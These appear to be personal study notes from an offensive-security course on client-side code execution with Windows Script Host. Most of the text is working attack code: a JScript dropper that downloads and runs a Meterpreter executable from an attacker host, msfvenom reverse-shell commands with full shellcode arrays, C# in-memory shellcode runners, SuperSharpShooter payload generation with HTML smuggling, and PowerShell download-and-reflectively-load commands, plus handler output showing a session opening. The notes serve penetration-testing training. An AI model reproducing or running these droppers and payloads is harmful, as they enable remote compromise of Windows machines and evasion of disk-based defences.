### Jscript on Windows 10
- Javascript attachments as alternative to Office VBA macros
- phishing attacks
- executing jscript outside a browser bypasses security settings

##### JS Script to open calc.exe
```js
var shell = new ActiveXObject("WScript.Shell")
var res = shell.Run("calc.exe");
```

#### VBScript to open calc.exe
```vbscript
Set objShell = CreateObject("WScript.Shell")
objShell.Run "calc.exe"
Set objShell = Nothing
```

### JScript Meterpreter Dropper

- _MSXML2.XMLHTTP_ object, which is based on the Microsoft XML Core Services,[1](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/creating-a-basic-dropper-in-jscript-14719/jscript-meterpreter-dropper-15063#fn-local_id_490-1) and its associated HTTP protocol parser. This object provides client-side protocol support to communicate with HTTP servers. Although it is not documented, it is present in all modern versions of Windows.
- To summarize our code, we'll use the (_url_) variable to set the URL of the Meterpreter executable. Then we'll create a Windows Script _MSXML2.XMLHTTP_ object and call the _Open_ method on that object to specify a GET request along with the URL. Finally, we'll send the GET request to download the file.
- met.exe
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$(hostname -I | cut -d' ' -f1) LPORT=443 EXITFUNCTION=thread -f exe -o met.exe
```
```Jscript
var url = "http://192.168.119.120/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();
```

- start webserver on kali host `python3 -m http.server 80`
- met.js
```javascript
var url = "http://192.168.1.110/met.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("met.exe");
```

- start metasploit on kali
- metasploit commands
```shell
usemsf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https 
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > show options

Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The local listener hostname
   LPORT     8443             yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > set lhost eth0
lhost => 192.168.1.110
msf6 exploit(multi/handler) > show options

Payload options (windows/x64/meterpreter/reverse_https):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.110    yes       The local listener hostname
   LPORT     443              yes       The local listener port
   LURI                       no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set EXITFUNC thread
EXITFUNC => thread
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://192.168.1.110:443
[!] https://192.168.1.110:443 handling request from 192.168.1.135; (UUID: pxlau20q) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.1.110:443 handling request from 192.168.1.135; (UUID: pxlau20q) Staging x64 payload (202844 bytes) ...
[!] https://192.168.1.110:443 handling request from 192.168.1.135; (UUID: pxlau20q) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.1.110:443 -> 192.168.1.135:52618) at 2024-05-11 14:15:46 -0400

meterpreter > whoami
[-] Unknown command: whoami. Run the help command for more details.
meterpreter > getuid
Server username: COMMANDO\dooley
```

- If we needed to set a proxy `oSrvXMLHTTPRequest.setProxy(proxySetting, varProxyServer, varBypassList);`
- MS Doc https://learn.microsoft.com/en-us/previous-versions/windows/desktop/ms760236(v=vs.85)?redirectedfrom=MSDN
- https://learn.microsoft.com/en-us/sql/ado/guide/data/command-streams?view=sql-server-ver16
- ADO stands for ActiveX Data Objects.  The ADO Stream Object is used to read, write, and manage a stream of binary or text data.



## JScript and C\#

- run in memory rather than touching disk
- needed to rebuild DotNetToJscript dll due to the following error
```cmd
c:\Users\dooley\Documents\github\DotNetToJScript>DotNetToJScript\bin\Debug\DotNetToJScript.exe ExampleAssembly\bin\Debug\ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
This tool should only be run on v2 of the CLR
```
- solution to issue https://github.com/tyranid/DotNetToJScript/issues/19
- code to launch command prompt
```c#
using System.Diagnostics;

using System.Runtime.InteropServices;

using System.Windows.Forms;

  

[ComVisible(true)]

public class TestClass

{

    public TestClass()

    {

        // Create a new ProcessStartInfo object

        ProcessStartInfo psi = new ProcessStartInfo

        {

            FileName = "cmd.exe", // Specify the executable to run (cmd.exe)

            UseShellExecute = true // Use the shell to execute the process

        };

  

        // Start the process

        Process.Start(psi);

    }

  

    public void RunProcess(string path)

    {

        Process.Start(path);

    }

}
```

- When calling Win32 APIs from PowerShell (in the previous module), we demonstrated the straightforward _Add-Type_ method and the more complicated reflection technique. However, the complexity of reflection was well worth it as we avoided writing C# source code and compiled assembly files temporarily to disk during execution. Luckily, when dealing with C#, we can compile the assembly before sending it to the victim and execute it in memory, which will avoid this problem.

## Shellcode Runner in C\#

- A signaled state indicates a resource is available for a process or thread to use it. A not-signaled state indicates the resource is in use.
- import Win32 APIs to execute shellcode in memory
```c#
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, 
    uint flProtect);

[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, 
    IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
```

#### Example code 64-bit

- set CPU arch to x64
```c#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args)
        {
            byte[] buf = new byte[630] {
  0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
  ...
  0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

- buf
```bash 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.110 LPORT=4444 EXITFUNC=thread -f csharp
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 511 bytes
Final size of csharp file: 2628 bytes
byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
0x52,0x20,0x56,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,
0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,
0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,
0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,
0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,
0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,
0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,
0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,
0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,
0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,
0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,
0xc0,0xa8,0x01,0x6e,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,
0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,
0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,
0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,
0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,
0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,
0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,
0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,
0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,
0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,
0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,
0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,
0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,
0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,
0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,
0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,
0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,
0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,
0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,
0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,
0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,
0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,
0xd5};

```


### SharpShooter

- python2 compliant one
- python3 fork https://github.com/SYANiDE-/SuperSharpShooter
	- needed to change requirements to `jsmin==3.0.0`
	- virtenv in ~/virtual-environments/supersharpshooter
- generate payload
```bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=$(hostname -I | cut -d' ' -f1) LPORT=443 EXITFUNCTION=thread -f raw -o shell.txt
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 622 bytes
Saved as: shell.txt
```
- convert to js 
```bash
❯ sudo python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile ~/Documents/OSEP/Pen300/04ClientSideWithWindowsScriptHost/shell.txt --output  test

             _____ __                    _____ __                __
            / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
            \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
           ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /
     SUPER/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/
                              /_/

     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
     SYANiDE, v3.1 Clinical Precision 

[*] Preview:  var entry_class = 'Shar'+'p'+'Sh'+'o'+'o'+'ter';
[*] Written delivery payload to output/test.js

```

### Smuggling 

```bash
sudo python3 SuperSharpShooter.py --payload js --dotnetver 4 --stageless --rawscfile ~/Documents/OSEP/Pen300/04ClientSideWithWindowsScriptHost/shell.txt --smuggle --template mcafee --output smuggle

             _____ __                    _____ __                __
            / ___// /_  ____ __________ / ___// /_  ____  ____  / /____  _____
            \__ \/ __ \/ __ `/ ___/ __ \\__ \/ __ \/ __ \/ __ \/ __/ _ \/ ___/
           ___/ / / / / /_/ / /  / /_/ /__/ / / / / /_/ / /_/ / /_/  __/ /
     SUPER/____/_/ /_/\__,_/_/  / .___/____/_/ /_/\____/\____/\__/\___/_/
                              /_/

     Dominic Chell, @domchell, MDSec ActiveBreach, v2.0
     SYANiDE, v3.1 Clinical Precision 

[*] Preview:  var entry_class = 'Sh'+'arp'+'Sho'+'ot'+'e'+'r';
[*] Written delivery payload to output/smuggle.js
[*] File [./output/smuggle.js] successfully loaded !  (will be smuggled in .html)
[*] Encrypted input file with key [haibrysxozefqzekgctaqwgcydmijpsr]
[*] File [./output/smuggle.html] successfully created !  
          ^^ Selected delivery method

```


## Reflective Load (Powershell)

- create project Class Library (.Net Framework)
- creating malicious dll

```csharp
using System;

using System.Collections.Generic;

using System.Linq;

using System.Runtime.InteropServices;

using System.Text;

using System.Threading.Tasks;

  

namespace ClassLibrary1

{

    public class Class1

    {

  

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]

        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

  

        [DllImport("kernel32.dll")]

        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,

          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

  

        [DllImport("kernel32.dll")]

        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  

  

    public static void runner()

    {

  

            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.110 LPORT=4444 EXITFUNC=thread -f csharp

            byte[] buf = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,

                                                        0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,

                                                        0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,

                                                        0x52,0x20,0x56,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,0x48,

                                                        0x8b,0x72,0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,

                                                        0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,

                                                        0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,

                                                        0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,

                                                        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,

                                                        0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,

                                                        0xe3,0x56,0x48,0xff,0xc9,0x4d,0x31,0xc9,0x41,0x8b,0x34,0x88,

                                                        0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,

                                                        0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,

                                                        0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,

                                                        0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,

                                                        0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,

                                                        0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,

                                                        0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,

                                                        0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,

                                                        0x32,0x00,0x00,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,

                                                        0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,

                                                        0xc0,0xa8,0x01,0x6e,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,

                                                        0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68,

                                                        0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,

                                                        0xd5,0x6a,0x0a,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,

                                                        0xc0,0x48,0xff,0xc0,0x48,0x89,0xc2,0x48,0xff,0xc0,0x48,0x89,

                                                        0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x48,0x89,0xc7,

                                                        0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba,

                                                        0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,

                                                        0xce,0x75,0xe5,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,

                                                        0x48,0x89,0xe2,0x4d,0x31,0xc9,0x6a,0x04,0x41,0x58,0x48,0x89,

                                                        0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,

                                                        0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41,

                                                        0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,

                                                        0x31,0xc9,0x41,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,

                                                        0xc3,0x49,0x89,0xc7,0x4d,0x31,0xc9,0x49,0x89,0xf0,0x48,0x89,

                                                        0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5,

                                                        0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40,

                                                        0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,

                                                        0x30,0xff,0xd5,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,

                                                        0xd5,0x49,0xff,0xce,0xe9,0x3c,0xff,0xff,0xff,0x48,0x01,0xc3,

                                                        0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41,0xff,0xe7,0x58,

                                                        0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,

                                                        0xd5};

  

  

            int size = buf.Length;

  

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

  

            Marshal.Copy(buf, 0, addr, size);

  

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

  

            WaitForSingleObject(hThread, 0xFFFFFFFF);

        }

  

    }

  

}
```
- interact with powershell to get meterpreter staged payload
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.1.110/ClassLibrary1.dll', 'C:\Users\dooley\ClassLibrary1.dll')

  

$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\dooley\ClassLibrary1.dll")

  

PS C:\Users\dooley> $class = $assem.GetType("ClassLibrary1.Class1")

$method = $class.GetMethod("runner")

$method.Invoke(0, $null)
```
- Executing this PowerShell results in a reverse Meterpreter shell, but it will download the assembly to disk before loading it. We can subvert this by instead using the _Load_[1](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/in-memory-powershell-revisited-14724/reflective-load-15054#fn-local_id_499-1) method, which accepts a _Byte_ array in memory instead of a disk file. In this case, we'll modify our PowerShell code to use the _DownloadData_[2](https://portal.offsec.com/courses/pen-300-9502/learning/client-side-code-execution-with-windows-script-host-14683/in-memory-powershell-revisited-14724/reflective-load-15054#fn-local_id_499-2) method of the _Net.WebClient_ class to download the DLL as a byte array.

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.110/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

## TO DO:
- Using what we have learned in these two modules, modify the C# and PowerShell code and use this technique from within a Word macro. Remember that Word runs as a 32-bit process.
